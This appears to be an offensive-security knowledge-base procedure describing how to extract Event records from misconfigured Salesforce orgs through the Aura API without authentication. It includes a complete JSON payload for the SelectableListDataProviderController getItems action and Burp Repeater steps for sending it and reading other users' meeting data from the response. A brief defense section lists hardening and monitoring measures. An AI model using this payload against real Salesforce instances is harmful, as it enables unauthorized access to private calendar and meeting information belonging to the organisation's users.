---
id: proc-uuid-4
name: Inject-Event-Object-Query-Payload
tags:
  - payload-injection
  - event-query
  - information-disclosure
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/salesforce-aura-event-query]]'
verified: false
platforms:
  - Web
  - Salesforce
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:25:13.193Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Local System]]'
---
# Inject-Event-Object-Query-Payload

## Summary

This procedure crafts and injects a JSON payload into the Aura API request to query the 'Event' object, exploiting loose permissions for unauthenticated data disclosure.

## Description

The payload uses the SelectableListDataProviderController to fetch Event records with full layout and pagination. In misconfigured Salesforce orgs, Guest users can access this without auth, leading to exposure of sensitive data like meetings. Technical approach involves URL-encoding the JSON in the 'message' parameter; prerequisites are a modified request in Repeater. Expected outcomes: Response with up to 100 records, including unauthorized user data.

## Requirements

1. Modified Aura request in Burp Repeater targeting the instance
2. Knowledge of Event object fields and Aura descriptors
3. No session cookies (for unauthenticated Guest access)

## Defense

Defensive measures and detection strategies:

- Enforce strict object-level and field-level security (FLS) for Guest profiles
- Audit and tighten Aura API permissions via Setup > Profiles > Object Settings
- Monitor API logs for anomalous queries to internal objects like Event
- Implement RLS to restrict record access by user

## Objectives

1. Query Event object without authentication
2. Retrieve sensitive records like internal meetings
3. Confirm information disclosure impact

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the JSON query for the Event object.

Use [[commands/salesforce-aura-event-query]] as the 'message' value:

```http
message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Event","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
```

> Paste into Repeater's POST body, URL-encode if needed. Expected output: Valid JSON in request.

### Step 2: Submit and Review Response

**Context**: Execute the request and analyze for disclosed data.

No command; Burp action:
- Click 'Send' in Repeater.
- Inspect response JSON under 'actions[0].returnValue.items'.

> Response contains Event array with fields like Id, Subject, IsAllDayEvent. Expected output: Sensitive records from other users if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Data from Local System]] Data from Local System

### Sub-Techniques

- None

## Commands Used

- [[commands/salesforce-aura-event-query]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[aura-payload]]
- [[event-object]]
- [[guest-access]]
